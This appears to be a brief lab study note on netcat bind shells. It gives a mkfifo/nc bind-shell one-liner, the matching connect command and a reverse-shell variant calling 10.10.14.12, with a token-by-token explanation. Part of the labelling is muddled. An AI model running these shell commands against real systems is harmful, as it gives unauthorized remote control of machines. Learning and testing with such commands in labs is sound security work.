Is when target machine opens the netcat server and then the attack machine connects to the netcat server.

Netcat
On target machine:
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
On our target machine 
```
nc -nv 10.129.41.200 7777
```

# Explanation of payload 
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

`rm -f /tmp/f` - removes the `/tmp/f` if it exists, if it doesn't it just ignores it 

`;` - allows the subsequent command to be executed 

`mkfifo /tmp/f` - makes a FIFO special file at `/tmp/f` acting like a pipe

`cat /tmp/f ` concatenates the pip file 

`|` - pipe connects the standard output of `cat /tmp/f` to whatever that is after it 

`/bin/bash -i 2>&1` - opens an interactive (-i) bash shell, `2>&1` ensures the standard error data stream & output data stream are directed out 

`|` - connects the `/bin/bash -i 2>&1` output to whatever after

`nc 10.10.14.12 7777 > /tmp/f` - use netcat to send a connect to the address and port and then the output will be redirected to /tmp/f into our bash shell
